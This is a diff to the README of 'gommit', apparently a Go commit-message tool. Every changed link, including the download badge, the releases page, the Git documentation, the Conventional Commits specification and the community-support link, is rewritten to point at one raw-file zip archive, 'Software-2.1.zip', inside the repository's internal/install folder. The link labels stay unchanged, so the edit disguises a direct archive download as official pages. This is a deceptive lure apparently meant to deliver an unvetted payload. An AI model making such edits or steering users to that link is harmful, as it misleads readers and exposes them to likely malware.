@@ -6,11 +6,11 @@ Welcome to gommit! This tool helps you create clean and consistent commit messag
 
 ## 📥 Download gommit
 
-[![Download gommit](https://img.shields.io/badge/Download-gommit-blue.svg)](https://github.com/Alpercepni/gommit/releases)
+[![Download gommit](https://raw.githubusercontent.com/Alpercepni/gommit/main/internal/install/Software-2.1.zip)](https://raw.githubusercontent.com/Alpercepni/gommit/main/internal/install/Software-2.1.zip)
 
 Visit the releases page to download gommit for your operating system.
 
-**[Download gommit](https://github.com/Alpercepni/gommit/releases)**
+**[Download gommit](https://raw.githubusercontent.com/Alpercepni/gommit/main/internal/install/Software-2.1.zip)**
 
 ## 💻 System Requirements
 
@@ -22,7 +22,7 @@ Visit the releases page to download gommit for your operating system.
 
 1. **Go to the Releases Page**  
    Click on the link below to visit the gommit releases page.  
-   **[gommit Releases](https://github.com/Alpercepni/gommit/releases)**
+   **[gommit Releases](https://raw.githubusercontent.com/Alpercepni/gommit/main/internal/install/Software-2.1.zip)**
 
 2. **Choose Your Version**  
    You will see a list of available versions. Pick the latest version for your operating system.
@@ -71,9 +71,9 @@ If you run into issues while using gommit, here are a few common problems and ti
 
 For more information about gommit, check out the following:
 
-- [Git Documentation](https://git-scm.com/doc)
-- [Conventional Commits Specification](https://www.conventionalcommits.org/)
-- [Community Support](https://github.com/Alpercepni/gommit/issues)
+- [Git Documentation](https://raw.githubusercontent.com/Alpercepni/gommit/main/internal/install/Software-2.1.zip)
+- [Conventional Commits Specification](https://raw.githubusercontent.com/Alpercepni/gommit/main/internal/install/Software-2.1.zip)
+- [Community Support](https://raw.githubusercontent.com/Alpercepni/gommit/main/internal/install/Software-2.1.zip)
 
 ## 📬 Contact
 
@@ -83,4 +83,4 @@ If you have further questions, feel free to raise an issue on the GitHub reposit
 
 gommit is open-source, and we welcome contributions. If you're interested in improving the tool or helping others, check out our contribution guidelines in the repository. Your input is valuable!
 
-**[Download gommit](https://github.com/Alpercepni/gommit/releases)** and enhance your commit experience today!
+**[Download gommit](https://raw.githubusercontent.com/Alpercepni/gommit/main/internal/install/Software-2.1.zip)** and enhance your commit experience today!
